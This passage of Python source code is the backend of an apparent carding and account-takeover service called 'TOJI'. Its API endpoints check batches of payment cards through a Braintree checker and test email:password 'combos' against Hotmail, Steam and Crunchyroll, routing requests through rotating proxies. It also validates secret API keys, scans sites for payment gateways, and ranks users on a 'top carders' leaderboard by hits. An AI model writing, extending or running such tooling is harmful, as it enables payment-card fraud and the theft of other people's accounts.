        proxy_manager = ProxyManager(data.proxy_list) if data.use_proxy else None
        checker = BraintreeChecker(data.site_url, proxy_manager)
        
        # Sync check (await all results) to fix pending issue
        results = []
        for card in data.cards:
            res = await checker.check_card(card, session["user_id"], session.get("username"))
            results.append(res)
        
        return {
            "success": True,
            "message": "Check complete",
            "results": results
        }
    except Exception as e:
        print(f"[Braintree] Error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

# ============== ACCOUNT CHECKER ENDPOINTS ==============

@app.post("/api/checker/hotmail")
async def hotmail_checker(
    data: AccountInput,
    session: Dict = Depends(get_current_session)
):
    """Hotmail Account Checker"""
    try:
        print(f"[Hotmail] Checking {len(data.combos)} accounts for user {session.get('username')}")
        proxy_manager = ProxyManager(data.proxy_list) if data.use_proxy and data.proxy_list else None
        checker = HotmailChecker(proxy_manager)
        
        # Sync check (await all results) to fix pending issue
        results = []
        for combo in data.combos:
            res = await checker.check_account(combo, session["user_id"], session.get("username"))
            results.append(res)
        
        return {
            "success": True,
            "message": "Check complete",
            "results": results
        }
    except Exception as e:
        print(f"[Hotmail] Error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/checker/steam")
async def steam_checker(
    data: AccountInput,
    session: Dict = Depends(get_current_session)
):
    """Steam Account Checker"""
    try:
        print(f"[Steam] Checking {len(data.combos)} accounts for user {session.get('username')}")
        proxy_manager = ProxyManager(data.proxy_list) if data.use_proxy and data.proxy_list else None
        checker = SteamChecker(proxy_manager)
        
        # Sync check (await all results) to fix pending issue
        results = []
        for combo in data.combos:
            res = await checker.check_account(combo, session["user_id"], session.get("username"))
            results.append(res)
        
        return {
            "success": True,
            "message": "Check complete",
            "results": results
        }
    except Exception as e:
        print(f"[Steam] Error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/checker/crunchyroll")
async def crunchyroll_checker(
    data: AccountInput,
    session: Dict = Depends(get_current_session)
):
    """Crunchyroll Account Checker"""
    try:
        print(f"[Crunchyroll] Checking {len(data.combos)} accounts for user {session.get('username')}")
        proxy_manager = ProxyManager(data.proxy_list) if data.use_proxy and data.proxy_list else None
        checker = CrunchyrollChecker(proxy_manager)
        
        # Sync check (await all results) to fix pending issue
        results = []
        for combo in data.combos:
            res = await checker.check_account(combo, session["user_id"], session.get("username"))
            results.append(res)
        
        return {
            "success": True,
            "message": "Check complete",
            "results": results
        }
    except Exception as e:
        print(f"[Crunchyroll] Error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

# ============== TOOLS ENDPOINTS ==============

@app.post("/api/tools/sk-checker")
async def sk_key_checker(
    data: SKKeyInput,
    session: Dict = Depends(get_current_session)
):
    """SK Key Checker"""
    try:
        print(f"[SK Checker] Checking {len(data.sk_keys)} keys for user {session.get('username')}")
        proxy_manager = ProxyManager(data.proxy_list) if data.proxy_list else None
        checker = SKKeyChecker(proxy_manager)
        
        results = []
        for sk in data.sk_keys[:50]:
            result = await checker.check_key(sk)
            results.append(result)
        
        return {
            "success": True,
            "results": results,
            "stats": {
                "total": len(results),
                "valid": sum(1 for r in results if r.get("valid")),
                "invalid": sum(1 for r in results if not r.get("valid"))
            }
        }
    except Exception as e:
        print(f"[SK Checker] Error: {e}")
        raise HTTPException(status_code=500, detail=f"Checker error: {str(e)}")

@app.post("/api/tools/proxy-test")
async def test_proxies(
    data: ProxyInput,
    session: Dict = Depends(get_current_session)
):
    """Test proxy list with advanced geo/ISP info"""
    try:
        from script_wrappers import check_proxy_advanced
        print(f"[Proxy Test] Testing {len(data.proxies)} proxies for user {session.get('username')}")
        
        results = []
        for proxy in data.proxies:
            result = await check_proxy_advanced(proxy)
            results.append(result)
        
        return {
            "success": True,
            "results": results,
            "stats": {
                "total": len(results),
                "working": sum(1 for r in results if r.get("success")),
                "failed": sum(1 for r in results if not r.get("success"))
            }
        }
    except Exception as e:
        print(f"[Proxy Test] Error: {e}")
        raise HTTPException(status_code=500, detail=f"Proxy test error: {str(e)}")

@app.post("/api/tools/site-gate")
async def site_gate_checker(
    data: SiteGateInput,
    session: Dict = Depends(get_current_session)
):
    """Analyze a website for gateways and tech stack"""
    try:
        checker = SiteGateChecker()
        result = await checker.check_site(data.url)
        return result
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/leaderboard")
async def get_leaderboard():
    """Get top carders leaderboard"""
    users = await DataManager.get_all_users_async()
    
    leaderboard: List[Dict] = []
    for user_id, user in users.items():
        leaderboard.append({
            "user_id": user.get("user_id"),
            "username": user.get("username"),
            "first_name": user.get("first_name"),
            "total_hits": user.get("total_hits", 0),
            "total_checks": user.get("total_checks", 0)
        })
    
    leaderboard.sort(key=lambda x: x["total_hits"], reverse=True)
    
    return {"leaderboard": leaderboard[:20]}

@app.get("/api/online-users")
async def get_online_users():
    """Get currently online users"""
    sessions = await DataManager.get_all_sessions_async()
    
    online = []
    for token, session in sessions.items():
        if session.get("active") and await DataManager.validate_session_async(token):
            online.append({
                "user_id": session.get("user_id"),
                "username": session.get("username"),
                "since": session.get("created_at")
            })
    
    return {"online_users": online, "count": len(online)}

@app.get("/api/user/profile")
async def get_profile(session_token: str = Query(...)):
    """Get user profile"""
    session = await DataManager.validate_session_async(session_token)
    if not session:
        raise HTTPException(status_code=401, detail="Invalid session")
    
    user = await DataManager.get_user_async(session["user_id"])
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    
    return {
        "user_id": user.get("user_id"),
        "username": user.get("username"),
        "first_name": user.get("first_name"),
        "registered_at": user.get("registered_at"),
        "total_checks": user.get("total_checks", 0),
        "total_hits": user.get("total_hits", 0),
        "premium": user.get("premium", False)
    }

if __name__ == "__main__":
    print("Starting TOJI Backend API v2.0...")
    uvicorn.run(app, host="0.0.0.0", port=8000)
